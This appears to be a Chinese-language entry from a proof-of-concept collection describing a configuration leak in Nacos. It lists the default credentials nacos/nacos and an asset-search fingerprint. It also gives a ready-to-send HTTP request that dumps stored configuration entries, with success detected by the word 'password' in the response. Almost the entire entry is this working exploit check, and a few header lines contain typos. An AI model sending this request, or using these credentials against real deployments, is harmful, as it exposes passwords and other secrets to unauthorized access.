﻿# Nacos 配置信息泄露漏洞

> 更新时间：2024-04-19

> 漏洞编号：

> 漏洞说明：默认密码nacos nacos

> 漏洞特征：app="nacos"

> 验证脚本：HTTP

```
GET /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99 HTTP/1.1
Accept:text/html,application/xhtml+xml,application/xml:q=0.9,image/avif,image/webp.*/*:q=0.8
Accept-Language:zh-CN,zh;q=0.8,zh-TW:q=0.7,zh-HK;q=0.5.en-US:q=0.3.en:q=0.2
Accept-Encoding: gzip, deflate
Comnection: close
Upgrade-Insecure-Requests: 1
```

> 响应代码特征：200

> 响应内容特征：password

> 上传文件定位：

> 验证文件来源：Nacos 配置信息泄露漏洞.poc

